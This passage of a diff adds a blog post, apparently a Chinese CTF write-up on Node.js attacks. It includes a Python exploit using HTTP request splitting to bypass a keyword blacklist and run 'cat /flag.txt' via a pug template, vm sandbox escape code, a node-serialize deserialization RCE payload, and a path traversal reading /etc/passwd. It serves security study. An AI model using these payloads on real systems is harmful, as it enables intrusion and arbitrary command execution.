+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">obj</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;upload success&#39;</span>, <span style="color:#a6e22e">filename</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">file_path</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">file_name</span>}            
+</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {                
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">obj</span>.<span style="color:#a6e22e">msg</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;upload failed&#39;</span>;            
+</span></span><span style="display:flex;"><span>      }            
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">obj</span>));        
+</span></span><span style="display:flex;"><span>    }    
+</span></span><span style="display:flex;"><span>  }) 
+</span></span><span style="display:flex;"><span>})  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 查看题目源码 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/source&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {    
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">sendFile</span>(<span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">__dirname</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/template/source.txt&#39;</span>)); });  
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/core&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {    
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">q</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">q</span>;    
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">resp</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;    
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">q</span>) {        
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://localhost:8081/source?&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">q</span>        
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">url</span>)        
+</span></span><span style="display:flex;"><span>   
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 对url字符进行waf        
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">trigger</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">blacklist</span>(<span style="color:#a6e22e">url</span>);        
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">trigger</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">true</span>) {            
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;error occurs!&#34;</span>);        
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {            
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">try</span> {                
+</span></span><span style="display:flex;"><span>      
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// node对/source发出请求，此处可以利用字符破坏进行切分攻击访问/file_upload路由(❗️此请求发出者为localhost主机)，实现对remoteAddress的绕过                
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">url</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">resp</span>) {                    
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">setEncoding</span>(<span style="color:#e6db74">&#39;utf8&#39;</span>);                    
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;error&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">err</span>) {                        
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">code</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;ECONNRESET&#34;</span>) {                            
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Timeout occurs&#34;</span>);                        
+</span></span><span style="display:flex;"><span>            }                    
+</span></span><span style="display:flex;"><span>          });                    
+</span></span><span style="display:flex;"><span>          
+</span></span><span style="display:flex;"><span>          <span style="color:#75715e">// 返回结果输出到/core                    
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          <span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;data&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">chunk</span>) {                        
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {                            
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">resps</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">chunk</span>.<span style="color:#a6e22e">toString</span>();                            
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">resps</span>);                        
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {                            
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span>);                        
+</span></span><span style="display:flex;"><span>            }                    
+</span></span><span style="display:flex;"><span>          }).<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;error&#39;</span>, (<span style="color:#a6e22e">e</span>) =&gt; {                        
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span>);                    
+</span></span><span style="display:flex;"><span>          });                
+</span></span><span style="display:flex;"><span>        });            
+</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {                
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">error</span>);            
+</span></span><span style="display:flex;"><span>      }        
+</span></span><span style="display:flex;"><span>    }    
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {        
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;search param &#39;q&#39; missing!&#34;</span>);    
+</span></span><span style="display:flex;"><span>  } 
+</span></span><span style="display:flex;"><span>})  
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 关键字waf 利用字符串拼接实现绕过 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">blacklist</span>(<span style="color:#a6e22e">url</span>) {    
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">evilwords</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;global&#34;</span>, <span style="color:#e6db74">&#34;process&#34;</span>, <span style="color:#e6db74">&#34;mainModule&#34;</span>, <span style="color:#e6db74">&#34;require&#34;</span>, <span style="color:#e6db74">&#34;root&#34;</span>, <span style="color:#e6db74">&#34;child_process&#34;</span>, <span style="color:#e6db74">&#34;exec&#34;</span>, <span style="color:#e6db74">&#34;\&#34;&#34;</span>, <span style="color:#e6db74">&#34;&#39;&#34;</span>, <span style="color:#e6db74">&#34;!&#34;</span>];    
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">arrayLen</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">evilwords</span>.<span style="color:#a6e22e">length</span>;     
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">arrayLen</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {        
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">trigger</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#a6e22e">evilwords</span>[<span style="color:#a6e22e">i</span>]);        
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">trigger</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">true</span>) {            
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>        
+</span></span><span style="display:flex;"><span>    }    
+</span></span><span style="display:flex;"><span>  } 
+</span></span><span style="display:flex;"><span>}  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">server</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">8081</span>, <span style="color:#66d9ef">function</span> () {    
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">host</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">server</span>.<span style="color:#a6e22e">address</span>().<span style="color:#a6e22e">address</span>    
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">port</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">server</span>.<span style="color:#a6e22e">address</span>().<span style="color:#a6e22e">port</span>    
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Example app listening at http://%s:%s&#34;</span>, <span style="color:#a6e22e">host</span>, <span style="color:#a6e22e">port</span>) 
+</span></span><span style="display:flex;"><span>})
+</span></span></code></pre></div><p>exp：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34; HTTP/1.1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host: 127.0.0.1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Connection: keep-alive
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">POST /file_upload HTTP/1.1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host: 127.0.0.1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Length: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZUlQgK81vgN7OB8A
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>body <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;------WebKitFormBoundaryZUlQgK81vgN7OB8A
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;lethe.pug&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Type: ../template
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">-var x = eval(&#34;glob&#34;+&#34;al.proce&#34;+&#34;ss.mainMo&#34;+&#34;dule.re&#34;+&#34;quire(&#39;child_&#39;+&#39;pro&#39;+&#39;cess&#39;)[&#39;ex&#39;+&#39;ecSync&#39;](&#39;cat /flag.txt&#39;).toString()&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">-return x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">------WebKitFormBoundaryZUlQgK81vgN7OB8A--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>format(len(body), body) \
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;+&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\u012b</span><span style="color:#e6db74">&#39;</span>)             \
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\u0120</span><span style="color:#e6db74">&#39;</span>)             \
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\u010d\u010a</span><span style="color:#e6db74">&#39;</span>)    \
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\u0122</span><span style="color:#e6db74">&#39;</span>)             \
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&#39;&#34;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\u0a27</span><span style="color:#e6db74">&#39;</span>)             \
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;[&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\u015b</span><span style="color:#e6db74">&#39;</span>)             \
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;]&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\u015d</span><span style="color:#e6db74">&#39;</span>) \
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;GET&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\u0120</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://ec05f88c-b4d9-4408-bdc5-56e251328bb1.node4.buuoj.cn:81/core?q=&#39;</span> <span style="color:#f92672">+</span> payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://ec05f88c-b4d9-4408-bdc5-56e251328bb1.node4.buuoj.cn:81/?action=lethe&#39;</span>)<span style="color:#f92672">.</span>text)
+</span></span></code></pre></div><p><a href="https://xz.aliyun.com/t/2894#toc-2" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/2894#toc-2</a>
+</p>
+<h1 id="nodejs原型链污染待更">nodejs原型链污染(待更)</h1>
+<p>关于原型链污染的原理，这位师傅的文章写的很详细，可以参考：https://www.bilibili.com/read/cv20687998</p>
+<p>如果服务端使用某些可以复制、继承变量的函数，函数的参数是用户可控，那么就有可能造成原型链污染攻击。</p>
+<h1 id="vm沙箱逃逸待geng">vm沙箱逃逸(待geng)</h1>
+<p>vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸</p>
+<p>逃逸例子：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">vm</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;vm&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">env</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">runInNewContext</span>(<span style="color:#e6db74">`this.constructor.constructor(&#39;return this.process.env&#39;)()`</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">env</span>);
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">vm</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;vm&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sandbox</span> <span style="color:#f92672">=</span> {};
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">script</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">Script</span>(<span style="color:#e6db74">&#34;this.constructor.constructor(&#39;return this.process.env&#39;)()&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">context</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">createContext</span>(<span style="color:#a6e22e">sandbox</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">env</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">runInContext</span>(<span style="color:#a6e22e">context</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">env</span>);
+</span></span></code></pre></div><p>执行以上两个例子之后可以获取到主程序环境中的环境变量（两个例子代码等价）</p>
+<p>创建vm环境时，首先要初始化一个对象 sandbox，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。</p>
+<p>因为<code>this.constructor.constructor</code>返回的是一个<code>Function constructor</code>，所以可以利用Function对象构造一个函数并执行。(此时Function对象的上下文环境是处于主程序中的) 这里构造的函数内的语句是<code>return this.process.env</code>，结果是返回了主程序的环境变量。</p>
+<p>配合<code>chile_process.exec()</code>就可以执行任意命令了：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">vm</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;vm&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">env</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">runInNewContext</span>(<span style="color:#e6db74">`const process = this.constructor.constructor(&#39;return this.process&#39;)();
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">process.mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString()`</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">env</span>);
+</span></span></code></pre></div><h1 id="node-serialize反序列化rce漏洞cve-2017-5941">node-serialize反序列化RCE漏洞(CVE-2017-5941)</h1>
+<p>漏洞出现在node-serialize模块0.0.4版本当中，使用<code>npm install node-serialize@0.0.4</code>安装模块。</p>
+<ul>
+<li>了解什么是IIFE：</li>
+</ul>
+<p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/%e7%ab%8b%e5%8d%b3%e6%89%a7%e8%a1%8c%e5%87%bd%e6%95%b0%e8%a1%a8%e8%be%be%e5%bc%8f" target="_blank" rel="noopener noreffer">IIFE（立即调用函数表达式）</a>
+是一个在定义时就会立即执行的  JavaScript 函数。</p>
+<p>IIFE一般写成下面的形式：</p>
+<pre tabindex="0"><code>(function(){ /* code */ }());
+// 或者
+(function(){ /* code */ })();
+</code></pre><ul>
+<li><code>node-serialize@0.0.4</code>漏洞点</li>
+</ul>
+<p>漏洞代码位于node_modules\node-serialize\lib\serialize.js中：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302071810191.png"
+        data-srcset="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302071810191.png, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302071810191.png 1.5x, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302071810191.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302071810191.png"
+        title="image-20230207181032087" /></p>
+<p>其中的关键就是：<code>obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')');</code>这一行语句，可以看到传递给eval的参数是用括号包裹的，所以如果构造一个<code>function(){}()</code>函数，在反序列化时就会被当中IIFE立即调用执行。来看如何构造payload：</p>
+<ul>
+<li>构造Payload</li>
+</ul>
+<pre tabindex="0"><code>serialize = require(&#39;node-serialize&#39;);
+var test = {
+ rce : function(){require(&#39;child_process&#39;).exec(&#39;ls /&#39;,function(error, stdout, stderr){console.log(stdout)});},
+}
+console.log(&#34;序列化生成的 Payload: \n&#34; + serialize.serialize(test));
+</code></pre><p>生成的Payload为：</p>
+<pre tabindex="0"><code>{&#34;rce&#34;:&#34;_$$ND_FUNC$$_function(){require(&#39;child_process&#39;).exec(&#39;ls /&#39;,function(error, stdout, stderr){console.log(stdout)});}&#34;}
+</code></pre><p>因为需要在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个<code>()</code>，结果如下：</p>
+<pre tabindex="0"><code>{&#34;rce&#34;:&#34;_$$ND_FUNC$$_function(){require(&#39;child_process&#39;).exec(&#39;ls /&#39;,function(error, stdout, stderr){console.log(stdout)});}()&#34;}
+</code></pre><p>(这里不能直接在对象内定义IIFE表达式，不然会序列化失败)</p>
+<p>传递给unserialize(注意转义单引号)：</p>
+<pre tabindex="0"><code>var serialize = require(&#39;node-serialize&#39;);
+var payload = &#39;{&#34;rce&#34;:&#34;_$$ND_FUNC$$_function(){require(\&#39;child_process\&#39;).exec(\&#39;ls /\&#39;,function(error, stdout, stderr){console.log(stdout)});}()&#34;}&#39;;
+serialize.unserialize(payload);
+</code></pre><p>执行命令成功，结果如图：</p>
+<p>[<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302071810943.png"
+        data-srcset="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302071810943.png, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302071810943.png 1.5x, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302071810943.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302071810943.png"
+        title="image-20230207181007855" /></p>
+<h1 id="nodejs-目录穿越漏洞复现cve-2017-14849">Node.js 目录穿越漏洞复现(CVE-2017-14849)</h1>
+<p>在vulhub上面可以直接下载到环境。</p>
+<p>漏洞影响的版本：</p>
+<ul>
+<li>Node.js 8.5.0 + Express 3.19.0-3.21.2</li>
+<li>Node.js 8.5.0 + Express 4.11.0-4.15.5</li>
+</ul>
+<p>运行漏洞环境：</p>
+<pre tabindex="0"><code>cd vulhub/node/CVE-2017-14849/
+docker-compose build
+docker-compose up -d
+</code></pre><p>用Burpsuite获取地址：<code>/static/../../../a/../../../../etc/passwd</code> 即可下载得到<code>/etc/passwd</code>文件</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302071809406.png"
+        data-srcset="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302071809406.png, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302071809406.png 1.5x, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302071809406.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302071809406.png"
+        title="image-20230207180948280" /></p>
+<p>具体分析可见：<a href="https://security.tencent.com/index.php/blog/msg/121" target="_blank" rel="noopener noreffer">Node.js CVE-2017-14849 漏洞分析</a>
+</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-08-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/ctf/nodejs/" data-title="nodejs" data-hashtags="nodejs"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/ctf/nodejs/" data-hashtag="nodejs"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/ctf/nodejs/" data-title="nodejs"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/ctf/nodejs/" data-title="nodejs"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/ctf/nodejs/" data-title="nodejs"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/nodejs/">Nodejs</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/ctf/nss%23roun8-web%E4%B8%93%E9%A1%B9%E8%B5%9B/" class="prev" rel="prev" title="NSS#roun8 web专项赛"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>NSS#roun8 web专项赛</a>
+            <a href="/posts/ctf/newstarctf-web/" class="next" rel="next" title="NewStarCTF-web">NewStarCTF-web<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
